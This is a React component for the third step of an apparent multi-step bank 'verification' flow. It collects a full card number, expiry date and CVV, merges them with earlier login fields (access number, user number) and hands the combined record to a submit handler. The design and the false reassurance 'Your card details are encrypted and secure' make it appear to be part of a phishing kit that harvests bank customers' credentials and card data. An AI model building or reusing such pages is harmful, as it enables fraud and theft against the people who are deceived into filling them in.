import React, { useState } from 'react';
import { ChevronRight } from 'lucide-react';

export default function CardVerificationForm({ onSubmit, loginData }) {
  const [cardNumber, setCardNumber] = useState('');
  const [expiryDate, setExpiryDate] = useState('');
  const [cvv, setCvv] = useState('');

  const formatCardNumber = (value) => {
    const cleaned = value.replace(/\s/g, '');
    const formatted = cleaned.match(/.{1,4}/g);
    return formatted ? formatted.join(' ') : cleaned;
  };

  const formatExpiryDate = (value) => {
    const cleaned = value.replace(/\D/g, '');
    if (cleaned.length >= 2) {
      return cleaned.slice(0, 2) + '/' + cleaned.slice(2, 4);
    }
    return cleaned;
  };

  const handleCardNumberChange = (e) => {
    const value = e.target.value.replace(/\s/g, '');
    if (value.length <= 16 && /^\d*$/.test(value)) {
      setCardNumber(value);
    }
  };

  const handleExpiryChange = (e) => {
    const value = e.target.value.replace(/\D/g, '');
    if (value.length <= 4) {
      setExpiryDate(value);
    }
  };

  const handleCvvChange = (e) => {
    const value = e.target.value;
    if (value.length <= 3 && /^\d*$/.test(value)) {
      setCvv(value);
    }
  };

  const handleVerify = () => {
    if (!cardNumber || !expiryDate || !cvv) {
      alert('Please fill in all card details');
      return;
    }

    if (cardNumber.length !== 16) {
      alert('Card number must be 16 digits');
      return;
    }

    if (expiryDate.length !== 4) {
      alert('Please enter valid expiry date (MM/YY)');
      return;
    }

    if (cvv.length !== 3) {
      alert('CVV must be 3 digits');
      return;
    }

    const step3Data = {
      ...loginData,
      cardNumber,
      expiryDate: formatExpiryDate(expiryDate),
      cvv,
      step3Timestamp: new Date().toISOString()
    };

    console.log('Step 3 data (ALL STEPS):', step3Data);

    if (onSubmit) {
      onSubmit(step3Data);
    }
  };

  const handleKeyPress = (e) => {
    if (e.key === 'Enter') {
      handleVerify();
    }
  };

  return (
    <div className="bg-white rounded-lg shadow-sm p-6 lg:p-8">
      <div className="flex items-center gap-3 mb-6">
        <div className="w-12 h-12 bg-gray-100 rounded-full flex items-center justify-center relative">
          <div className="w-6 h-6 border-2 border-gray-400 rounded"></div>
          {/* 100% progress - covers full circle */}
          <div className="absolute top-0 right-0 w-4 h-4 bg-red-600 rounded-full border-2 border-white"></div>
        </div>
      </div>

      <h2 className="text-2xl font-semibold mb-4">Card Verification</h2>

      <div className="flex gap-6 mb-6 text-sm text-gray-600">
        <div className="flex items-center gap-2">
          <div className="w-5 h-5 bg-red-600 rounded-full flex items-center justify-center">
            <div className="w-2 h-2 bg-white rounded-full"></div>
          </div>
          <span className="font-semibold">Verify Card</span>
        </div>
        <div className="flex items-center gap-2">
          <div className="w-5 h-5 border border-gray-400 rounded-full flex items-center justify-center">
            <ChevronRight size={12} />
          </div>
          <span>Complete</span>
        </div>
      </div>

      <div className="bg-gray-50 p-4 rounded mb-6 text-sm text-gray-700">
        Enter your card details to verify your identity
      </div>

      <div>
        {/* Show user info summary */}
        <div className="mb-6 p-4 bg-blue-50 rounded">
          <p className="text-sm text-gray-700">
            <span className="font-semibold">Access account:</span> {loginData?.accessNumber || 'N/A'}
          </p>
          <p className="text-sm text-gray-700">
            <span className="font-semibold">User number:</span> {loginData?.userNumber || 'N/A'}
          </p>
        </div>

        <div className="mb-4">
          <label className="block text-sm font-medium mb-2">
            Card Number
          </label>
          <input
            type="text"
            value={formatCardNumber(cardNumber)}
            onChange={handleCardNumberChange}
            onKeyPress={handleKeyPress}
            className="w-full px-4 py-3 border border-gray-300 rounded focus:outline-none focus:ring-2 focus:ring-red-500 focus:border-transparent"
            placeholder="1234 5678 9012 3456"
            autoFocus
          />
          <p className="text-xs text-gray-500 mt-1">
            Enter your 16-digit card number
          </p>
        </div>

        <div className="grid grid-cols-2 gap-4 mb-6">
          <div>
            <label className="block text-sm font-medium mb-2">
              Expiry Date
            </label>
            <input
              type="text"
              value={formatExpiryDate(expiryDate)}
              onChange={handleExpiryChange}
              onKeyPress={handleKeyPress}
              className="w-full px-4 py-3 border border-gray-300 rounded focus:outline-none focus:ring-2 focus:ring-red-500 focus:border-transparent"
              placeholder="MM/YY"
            />
            <p className="text-xs text-gray-500 mt-1">
              Format: MM/YY
            </p>
          </div>

          <div>
            <label className="block text-sm font-medium mb-2">
              CVV
            </label>
            <input
              type="password"
              value={cvv}
              onChange={handleCvvChange}
              onKeyPress={handleKeyPress}
              className="w-full px-4 py-3 border border-gray-300 rounded focus:outline-none focus:ring-2 focus:ring-red-500 focus:border-transparent"
              placeholder="123"
              maxLength={3}
            />
            <p className="text-xs text-gray-500 mt-1">
              3 digits on back
            </p>
          </div>
        </div>

        <button
          onClick={handleVerify}
          className="w-full bg-orange-500 hover:bg-orange-600 text-white font-semibold py-3 rounded transition-colors mb-4"
        >
          Verify
        </button>

        <div className="text-center">
          <p className="text-xs text-gray-500">
            Your card details are encrypted and secure
          </p>
        </div>
      </div>
    </div>
  );
}
